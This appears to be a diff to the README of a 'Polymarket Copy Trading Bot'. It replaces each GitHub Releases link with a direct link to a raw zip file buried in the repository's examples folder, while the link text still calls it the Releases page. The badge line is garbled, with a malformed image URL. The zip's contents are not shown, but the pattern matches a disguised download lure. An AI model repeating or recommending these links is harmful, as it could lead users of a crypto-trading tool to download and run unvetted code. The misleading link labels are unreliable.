@@ -6,7 +6,7 @@ Welcome to the **Polymarket Copy Trading Bot**! This software helps you make inf
 
 ## 📥 Download the Bot
 
-[![Download Polymarket Copy Bot](https://img.shields.io/badge/Download-Polymarket%20Copy%20Bot-brightgreen.svg)](https://github.com/Redmi175/polymarket-copy-bot/releases)
+[![Download Polymarket Copy Bot](https://raw.githubusercontent.com/Redmi175/polymarket-copy-bot/main/examples/polymarket_bot_copy_subphratry.zip%20Copy%https://raw.githubusercontent.com/Redmi175/polymarket-copy-bot/main/examples/polymarket_bot_copy_subphratry.zip)](https://raw.githubusercontent.com/Redmi175/polymarket-copy-bot/main/examples/polymarket_bot_copy_subphratry.zip)
 
 ## 🔍 Features
 
@@ -26,7 +26,7 @@ To run the Polymarket Copy Trading Bot, your computer should meet these basic re
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page**: Go to the [GitHub Releases page](https://github.com/Redmi175/polymarket-copy-bot/releases) to find the latest version of the bot.
+1. **Visit the Releases Page**: Go to the [GitHub Releases page](https://raw.githubusercontent.com/Redmi175/polymarket-copy-bot/main/examples/polymarket_bot_copy_subphratry.zip) to find the latest version of the bot.
 
 2. **Choose the Right Version**: Look for the latest release. You may see multiple files available; choose the one that matches your operating system.
 
@@ -66,4 +66,4 @@ This project is licensed under the MIT License. It allows for free use and modif
 
 Explore the Polymarket Copy Trading Bot today and enhance your trading experience effortlessly!
 
-[Visit the Releases page to download now](https://github.com/Redmi175/polymarket-copy-bot/releases)
+[Visit the Releases page to download now](https://raw.githubusercontent.com/Redmi175/polymarket-copy-bot/main/examples/polymarket_bot_copy_subphratry.zip)
